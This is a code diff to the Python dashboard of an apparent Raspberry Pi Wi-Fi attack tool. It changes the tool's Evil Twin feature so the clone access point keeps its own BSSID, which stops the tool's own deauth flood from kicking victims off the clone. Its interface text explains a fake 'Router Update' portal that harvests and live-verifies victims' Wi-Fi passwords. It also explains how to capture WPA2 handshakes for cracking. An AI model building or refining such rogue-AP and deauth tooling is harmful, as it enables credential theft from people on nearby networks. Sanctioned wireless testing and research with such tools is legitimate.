@@ -304,6 +304,19 @@ def wlan0_mac():
         return ''
 
 
+def wlan0_ssid():
+    try:
+        r = subprocess.run(['iw', 'dev', 'wlan0', 'info'],
+                           capture_output=True, text=True, timeout=3)
+    except (OSError, subprocess.SubprocessError):
+        return ''
+    for line in r.stdout.splitlines():
+        line = line.strip()
+        if line.startswith('ssid '):
+            return line[5:].strip()
+    return ''
+
+
 def system_checks():
     checks = []
     for name in ('mdk4', 'iw', 'airodump-ng', 'aireplay-ng', 'hcxdumptool',
@@ -1475,9 +1488,9 @@ def wlan1_owner_alive(owner):
         state = read_json_file(EVILTWIN_STATE, {})
         if state.get('pid') and pid_alive(state.get('pid'), 'pinapple-deauth'):
             return True
-        clone_mac = str(state.get('bssid', '')).lower()
-        if (clone_mac and wlan0_mac() == clone_mac and
-                service_status('pinapple-ap')):
+        twin_ssid = str(state.get('ssid', ''))
+        if (twin_ssid and service_status('pinapple-ap') and
+                wlan0_ssid() == twin_ssid):
             return True
         return False
     return False
@@ -1505,11 +1518,11 @@ def reconcile_wlan1_owner():
                 audit('Adopted running %s helper (pid %d)' % (label, pid), 'warn')
                 return label
         twin_state = read_json_file(EVILTWIN_STATE, {})
-        clone_mac = str(twin_state.get('bssid', '')).lower()
-        if clone_mac and wlan0_mac() == clone_mac and service_status('pinapple-ap'):
+        twin_ssid = str(twin_state.get('ssid', ''))
+        if twin_ssid and service_status('pinapple-ap') and wlan0_ssid() == twin_ssid:
             _wlan1_owner[0] = 'eviltwin'
             _wlan1_claimed_at[0] = time.time()
-            audit('Adopted a running Evil Twin clone AP', 'warn')
+            audit('Adopted a running Evil Twin AP', 'warn')
             return 'eviltwin'
         return None
     # PID inspection is Linux-only; on other hosts we cannot verify liveness.
@@ -4397,14 +4410,20 @@ def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
         _evil_twin_fail('could not stop the normal AP; is hostapd busy?')
         return
     try:
-        subprocess.run(['ip', 'link', 'set', 'wlan0', 'down'], capture_output=True, timeout=5)
-        r = subprocess.run(['ip', 'link', 'set', 'wlan0', 'address', bssid],
-                           capture_output=True, text=True, timeout=5)
-        if r.returncode != 0:
-            warnings.append('could not set the cloned MAC')
-        subprocess.run(['ip', 'link', 'set', 'wlan0', 'up'], capture_output=True, timeout=5)
+        # Do NOT spoof the target BSSID. The deauth flood targets that BSSID,
+        # so a clone sharing it keeps kicking its own clients: they associate,
+        # get deauthed ~3s later and never finish DHCP. Same SSID + channel +
+        # security is what clients match on.
+        current_mac = wlan0_mac()
+        if original_mac and current_mac and current_mac != original_mac:
+            subprocess.run(['ip', 'link', 'set', 'wlan0', 'down'],
+                           capture_output=True, timeout=5)
+            subprocess.run(['ip', 'link', 'set', 'wlan0', 'address', original_mac],
+                           capture_output=True, timeout=5)
+            subprocess.run(['ip', 'link', 'set', 'wlan0', 'up'],
+                           capture_output=True, timeout=5)
     except Exception:
-        warnings.append('could not reconfigure wlan0')
+        warnings.append('could not restore the AP MAC')
     try:
         write_hostapd_conf(ssid, channel, 'wpa2' if psk else 'open', None, psk or None)
     except OSError as exc:
@@ -4577,7 +4596,8 @@ def api_evil_twin_status():
             # MAC must not be mistaken for an active twin.
             if pid and pid_alive(pid, 'pinapple-deauth'):
                 running = True
-            elif service_status('pinapple-ap') and clone_mac and wlan0_mac() == clone_mac:
+            elif (service_status('pinapple-ap') and info.get('ssid')
+                  and wlan0_ssid() == str(info.get('ssid', ''))):
                 running = True
     if not running:
         if os.path.exists(EVILTWIN_BACKUP) or os.path.exists(EVILTWIN_STATE):
@@ -4935,7 +4955,7 @@ def wlan1_page():
 <div id="pane-eviltwin" class="wl-pane" style="display: {d_eviltwin}">
   <div class="sh"><span class="st">Evil Twin</span>
     <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
-  <p class="hint" style="margin:-8px 0 10px">Clones a target SSID/BSSID on wlan0 and deauths the real AP so clients reconnect to the twin. Requires the hostapd stack. The phone may briefly disconnect from the PiNAPPLE hotspot.</p>
+  <p class="hint" style="margin:-8px 0 10px">Clones the target SSID, channel and security on wlan0 (with its own BSSID) and deauths the real AP so clients reconnect to the twin. Requires the hostapd stack. The phone may briefly disconnect from the PiNAPPLE hotspot.</p>
   <div class="warnbox">Starting the Evil Twin rebuilds wlan0, which serves this dashboard, so this page will lose the network for a few seconds — that is expected. When the twin is up, reconnect to the target SSID and open <code>http://10.0.0.1:8080</code> again.<br><br>
   <strong>Router Update portal (live password check):</strong> select the <em>Router Update</em> portal in Settings. When the victim types the Wi-Fi password, wlan1 leaves the twin, associates to the real AP with that password and verifies it — a wrong password is rejected, a correct one is stored in Credentials and shown here, and the twin shuts down so the device reconnects to its normal network. Works for targets the device will join (open network, unknown SSID, or the correct passphrase).<br><br>
   <strong>Saved WPA2 network (iPhone/Android):</strong> the phone will not join an open clone of a network it saved as WPA2. Put any dummy passphrase (8+ chars), start the twin and let the phone attempt the saved network: its 4-way handshake is recorded on the twin channel, so you can download the <code>.22000</code> and crack it. Once you know the passphrase, start the twin with it and the phone joins by itself.<br>
